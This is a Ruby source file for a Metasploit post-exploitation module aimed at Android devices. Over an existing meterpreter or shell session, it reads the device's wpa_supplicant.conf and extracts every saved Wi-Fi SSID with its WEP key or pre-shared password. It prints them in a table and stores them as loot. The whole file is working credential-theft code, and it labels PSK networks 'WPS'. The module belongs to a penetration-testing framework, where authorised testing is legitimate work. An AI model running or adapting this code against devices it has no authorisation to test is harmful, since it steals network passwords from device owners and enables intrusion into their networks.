##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Android::System

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Displays wireless SSIDs and PSKs",
        'Description'   => %q{
            This module displays all wireless AP creds saved on the target device.
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['Auxilus'],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'       => 'android',
      }
    ))
  end

  def run
    data = read_file("/data/misc/wifi/wpa_supplicant.conf")
    parsed = data.split("network=")
    aps ||= []
    parsed.each do |block|
      next if block.split("ssid")[1].nil?
      ssid = block.split("ssid")[1].split("=")[1].split("\n").first.gsub(/"/, '')
      #TODO Add more types
      if search_token(block, "wep_key0")
        net_type = "WEP"
        pwd = get_password(block, "wep_key0")
      elsif search_token(block, "psk")
        net_type = "WPS"
        pwd = get_password(block, "psk")
      else
        net_type = "NONE"
        pwd = ''
      end

      aps << [ssid, net_type, pwd]
    end

    if aps.empty?
      print_error("No wireless APs found on the device")
      return
    end
    ap_tbl = Rex::Text::Table.new(
      'Header'  => 'Wireless APs',
      'Indent'  => 1,
      'Columns' => ['SSID','net_type', 'password']
    )

    aps.each do |ap|
      ap_tbl << [
        ap[0],  # SSID
        ap[1],  # TYPE
        ap[2]   # PASSWORD
      ]
    end

    print_line(ap_tbl.to_s)
    p = store_loot(
      'wireless.ap.creds',
      'text/csv',
      session,
      ap_tbl.to_csv,
      File.basename('wireless_ap_credentials.txt')
    )
    print_good("Secrets stored in: #{p}")

  end

  def search_token(block, token)
    block.to_s.include?(token)
  end

  def get_password(block, token)
    return '' unless block.to_s.include? token

    block.split("\n").each do |line|
      next unless line =~ /^\s*#{token}\s*=/
      psk = line.split('=')[1..-1].join('=')
      return psk.scan(/^"(.+)"$/).flatten.first.to_s
    end
  end
end
